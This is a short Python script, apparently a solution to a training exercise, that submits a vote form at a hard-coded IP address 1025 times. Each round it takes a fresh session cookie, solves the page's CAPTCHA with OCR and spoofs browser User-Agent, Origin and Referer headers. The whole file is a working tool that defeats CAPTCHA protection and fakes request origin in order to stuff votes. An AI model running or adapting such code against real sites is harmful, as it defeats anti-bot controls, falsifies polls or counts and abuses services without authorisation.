#!/usr/bin/python3
import requests
import pytesseract
from PIL import Image
from lxml.html import fromstring

url = 'http://158.69.76.135/level3.php'
img = 'http://158.69.76.135/captcha.php'
myobj = {
    'id': '1',
    'key': None,
    'captcha': None,
    'holdthedoor': 'Submit+Query'
}
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Origin': 'http://158.69.76.135',
    'Referer': 'http://158.69.76.135/level3.php'
}

for i in range(1025):
    session = requests.Session()
    session.trust_env = False
    r = session.get(url)
    myobj['key'] = r.cookies['HoldTheDoor']
    pic =  session.get(img)
    with open("captcha.png", 'wb') as f:
        f.write(pic.content)
    myobj['captcha'] = pytesseract.image_to_string(Image.open("captcha.png"))
    x = session.post(url, data = myobj, headers=headers, timeout=20)
    print(i, x.text)
